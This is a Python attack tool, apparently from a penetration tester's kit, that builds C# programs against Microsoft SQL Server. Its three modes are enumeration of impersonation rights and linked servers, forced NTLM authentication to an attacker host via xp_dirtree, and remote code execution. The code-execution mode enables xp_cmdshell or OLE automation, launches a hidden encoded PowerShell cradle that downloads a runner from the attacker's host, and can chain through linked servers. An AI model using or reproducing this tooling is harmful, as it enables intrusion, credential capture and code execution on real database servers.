import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunner import runner,gen,powershell_b64encode,makeoneliner,cradleps1
from makerdpthief import makecombo_rdpthief as makecombo_sql

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"

devhost = "192.168.135.7"

impersonate_login = "0" #"0" #"1"
impersonate_user = "0" #"0" #"1"

def writesql(bitness,lhost,lport,ptype,binary,targethost,hops,bypass,service):
    sqlfilename = "MSSQL.cs"

    localsql = hops[0]
    hops=hops[1:]

    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGF0YS5TcWxDbGllbnQ7CgpuYW1lc3BhY2UgTVNTUUwKewogICAgcHVibGljIGNsYXNzIFByb2dyYW0KICAgIHsKICAgICAgICBwdWJsaWMgc3RhdGljIFN0cmluZyBleGVjdXRlUXVlcnkoU3RyaW5nIHF1ZXJ5LCBTcWxDb25uZWN0aW9uIGNvbikKICAgICAgICB7CiAgICAgICAgICAgIFNxbENvbW1hbmQgY21kID0gbmV3IFNxbENvbW1hbmQocXVlcnksIGNvbik7CiAgICAgICAgICAgIFNxbERhdGFSZWFkZXIgcmVhZGVyID0gY21kLkV4ZWN1dGVSZWFkZXIoKTsKICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFN0cmluZyByZXN1bHQgPSAiIjsKICAgICAgICAgICAgICAgIHdoaWxlIChyZWFkZXIuUmVhZCgpID09IHRydWUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ICs9IHJlYWRlclswXSArICJcbiI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZWFkZXIuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuICIiOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgZ2V0R3JvdXBNZW1iZXJzaGlwKFN0cmluZyBncm91cFRvQ2hlY2ssIFNxbENvbm5lY3Rpb24gY29uKQogICAgICAgIHsKICAgICAgICAgICAgU3RyaW5nIHJlcyA9IGV4ZWN1dGVRdWVyeSgkIlNFTEVDVCBJU19TUlZST0xFTUVNQkVSKCd7Z3JvdXBUb0NoZWNrfScpOyIsIGNvbik7CiAgICAgICAgICAgIGludCByb2xlID0gaW50LlBhcnNlKHJlcyk7CiAgICAgICAgICAgIGlmIChyb2xlID09IDEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiWytdIFVzZXIgaXMgYSBtZW1iZXIgb2YgdGhlICd7Z3JvdXBUb0NoZWNrfScgZ3JvdXAuIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIlstXSBVc2VyIGlzIG5vdCBhIG1lbWJlciBvZiB0aGUgJ3tncm91cFRvQ2hlY2t9JyBncm91cC4iKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIHNlcnYgPSAiZGMwMS5jb3JwMS5jb20iOwo="
    mid = "ICAgICAgICAgICAgU3RyaW5nIGRiID0gIm1hc3RlciI7CiAgICAgICAgICAgIFN0cmluZyBjb25TdHIgPSAkIlNlcnZlciA9IHtzZXJ2fTsgRGF0YWJhc2UgPSB7ZGJ9OyBJbnRlZ3JhdGVkIFNlY3VyaXR5ID0gVHJ1ZTsiOwogICAgICAgICAgICBTcWxDb25uZWN0aW9uIGNvbiA9IG5ldyBTcWxDb25uZWN0aW9uKGNvblN0cik7CgogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgY29uLk9wZW4oKTsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gQXV0aGVudGljYXRlZCB0byBNU1NRTCBTZXJ2ZXIhIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlstXSBBdXRoZW50aWNhdGlvbiBmYWlsZWQuIik7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvLyBFbnVtZXJhdGUgbG9naW4gaW5mbwogICAgICAgICAgICBTdHJpbmcgbG9naW4gPSBleGVjdXRlUXVlcnkoIlNFTEVDVCBTWVNURU1fVVNFUjsiLCBjb24pOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIlsqXSBMb2dnZWQgaW4gYXM6IHtsb2dpbn0iKTsKICAgICAgICAgICAgU3RyaW5nIHVuYW1lID0gZXhlY3V0ZVF1ZXJ5KCJTRUxFQ1QgVVNFUl9OQU1FKCk7IiwgY29uKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJbKl0gRGF0YWJhc2UgdXNlcm5hbWU6IHt1bmFtZX0iKTsKICAgICAgICAgICAgZ2V0R3JvdXBNZW1iZXJzaGlwKCJwdWJsaWMiLCBjb24pOwogICAgICAgICAgICBnZXRHcm91cE1lbWJlcnNoaXAoInN5c2FkbWluIiwgY29uKTs="
    lower = "ICAgICAgICAgICAgY29uLkNsb3NlKCk7CiAgICAgICAgfQogICAgfQp9"
    locallogin = "String serv = \"%s\";" % localsql
    datalogin = "executeQuery(\"use msdb; EXECUTE AS LOGIN = 'sa';\", con);"
    datauser = "executeQuery(\"use msdb; EXECUTE AS USER = 'dbo';\", con);"

    if ptype == "enum":
        enumexecutioncontext = "SELECT SYSTEM_USER"
        enumimpersonation = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
        enumlinkedservers = "EXEC sp_linkedservers"
        
        if len(hops) == 0:
            data = "String exeres = executeQuery(\"%s\", con);\n" % enumexecutioncontext
            data += "            "
            data += "String impres = executeQuery(\"%s\", con);\n" % enumimpersonation
            data += "            "
            data += "String linkres = executeQuery(\"%s\", con);\n" % enumlinkedservers 
            data += "            "+"Console.WriteLine($\"[*] {exeres} on %s can impersonate the following logins: {impres}\");" % (localsql) + "\n"
            data += "            "+"Console.WriteLine($\"[*] Found on %s linked servers:\\n{linkres}\");" % (localsql) + "\n"
        else:
            hops = hops[::-1]
            for hop in range(len(hops)):
                enumexecutioncontext = enumexecutioncontext.replace('\'','\'\'')
                enumimpersonation = enumimpersonation.replace('\'','\'\'')
                enumlinkedservers = enumlinkedservers.replace('\'','\'\'')
                enumexecutioncontext = "EXEC ('%s') AT [%s]" % (enumexecutioncontext,hops[hop])
                enumimpersonation = "EXEC ('%s') AT [%s]" % (enumimpersonation,hops[hop])
                enumlinkedservers = "EXEC ('%s') AT [%s]" % (enumlinkedservers,hops[hop])
                pass 
            data = "String exeres = executeQuery(\"%s\", con);\n" % enumexecutioncontext
            data += "            "
            data += "String impres = executeQuery(\"%s\", con);\n" % enumimpersonation
            data += "            "
            data += "String linkres = executeQuery(\"%s\", con);\n" % enumlinkedservers
            lasthop = hops[0]
            data += "            "+"Console.WriteLine($\"\\n[*] Executing on %s as: {exeres}\");" % (lasthop) + "\n"        
            data += "            "+"Console.WriteLine($\"[*] {exeres} on %s can impersonate the following logins: {impres}\");" % (lasthop) + "\n"
            data += "            "+"Console.WriteLine($\"[*] Found on %s linked servers:\\n{linkres}\");" % (lasthop) + "\n"
        basequery = enumexecutioncontext + "\n" + enumimpersonation + "\n" + enumlinkedservers
        pass
    if ptype == "ntlm":
        basequery = "EXEC (\'master..xp_dirtree \\\"\\\\\\\\%s\\\\share\\\"\')" % lhost
        if len(hops) == 0:
            data = "executeQuery(\"%s\", con);" % basequery
        else:
            hops = hops[::-1]
            for hop in range(len(hops)):
                basequery = basequery.replace('\'','\'\'')
                basequery = "EXEC ('%s') AT [%s]" % (basequery,hops[hop])
                pass 
            data = "executeQuery(\"%s\", con);" % basequery
            pass
    if ptype == "rce":
        if binary == "0":
                runnerfilename = runner(lhost,lport,bitness)
                fcradle,cradle = cradleps1(lhost,runnerfilename)
                target = "http://%s/%s" % (lhost,runnerfilename)
                target = cradle % target
                binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
                binname = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
                binary = "%s%s" % (binname,binargs)
        if service == "xp":
            basequery = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            basequery += " EXEC xp_cmdshell '%s';" % (binary)
            if len(hops) == 0:
                data = "executeQuery(\"%s\", con);" % basequery
            else:
                hops = hops[::-1]
                for hop in range(len(hops)):
                    basequery = basequery.replace('\'','\'\'')
                    basequery = "EXEC ('%s') AT [%s]" % (basequery,hops[hop])
                    pass 
                data = "executeQuery(\"%s\", con);" % basequery
            pass 
        if service == "sp":
            basequery = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"
            basequery += " DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '%s';" % binary
            if len(hops) == 0:
                data = "executeQuery(\"%s\", con);" % basequery
            else:
                hops = hops[::-1]
                for hop in range(len(hops)):
                    basequery = basequery.replace('\'','\'\'')
                    basequery = "EXEC ('%s') AT [%s]" % (basequery,hops[hop])
                    pass 
                data = "executeQuery(\"%s\", con);" % basequery
            pass 

    with open(sqlfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        mid = base64.b64decode(mid).decode() 
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            "+locallogin + "\n")
        f.write(mid + "\n")
        if impersonate_login == "1":
            f.write("            "+datalogin + "\n")
        if impersonate_user == "1":
            f.write("            "+datauser + "\n")
        f.write("            "+data + "\n")
        f.write(lower)
    f.close()
    print('[+] executing from: %s' % localsql)
    print('[*] basequery:\n%s' % basequery)
    print('[+] sql cs written: %s' % sqlfilename)
    return sqlfilename
    pass

def makesql(bitness,lhost,lport,ptype,binary,targethost,hops,bypass,service):
    sqlfilename = writesql(bitness,lhost,lport,ptype,binary,targethost,hops,bypass,service)
    csfilepath = "/home/kali/data/MSSQL/MSSQL/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "MSSQL.exe"

    copy(sqlfilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)

    makecombo_sql(lhost,exefilename)
    pass 

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='ptype',help='enum,ntlm,rce')
    parser.add_argument('--binary','-b',required=False,dest='binary',help='Inject, Hollow') #'any target binary on victim, e.g. c:\\windows\\tasks\\bin.exe') #, or Runspace')
    parser.add_argument('--target','-n',required=False,dest='targethost',help='target hostname, e.g. rdc01') # default: [TARGETHOST]
    parser.add_argument('--hops','-q',required=False,dest='hops',help='hops/linked servers in order!, e.g. app01,rdc01')    
    parser.add_argument('--bypass','-k',required=False,dest='bypass',help='run or com, applocker bypass techniques')
    parser.add_argument('--service','-s',required=False,dest='service',help='rce method, e.g. xp or sp') # default: xp   
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    binary = args.binary
    targethost = args.targethost
    hops = args.hops
    bypass = args.bypass
    service = args.service

    if binary == None: binary = "0"
    if targethost == None: targethost = "0"
    if hops == None: hops = "0"
    if bypass == None: bypass = "0"
    if service == None: service = "0"

    if hops != "0":
        hops = hops.split(',')
        print('[DEBUG] hops: %s' % hops)

    if ptype == "rce":
        if service == "0":
            print('[!] default rce method used: xp_cmdshell (xp)!')
            service = "xp"
        if service == "sp":
            print("[*] rce method used: sp_oacreate (sp)!")
        if service == "xp":
            print("[*] rce method used: xp_cmdshell (xp)!")
        if binary == "0":
            print('[!] no binary specified -> remote callback to run.txt will be used!')
        if binary != "0":
            if "c:\\" not in binary:
                print('[!] provide full path! e.g. c:\\windows\\tasks\\bin.exe . terminating!')
                sys.exit()
    if ptype == "ntlm":
        print("[*] -p ntlm chosen - make sure ntlmrelayx or responder listening!")
    if ptype not in ("rce","enum","ntlm"):
        print('[*] default ptype mode used: enum')
        ptype = "enum"

    makesql(bitness,lhost,lport,ptype,binary,targethost,hops,bypass,service)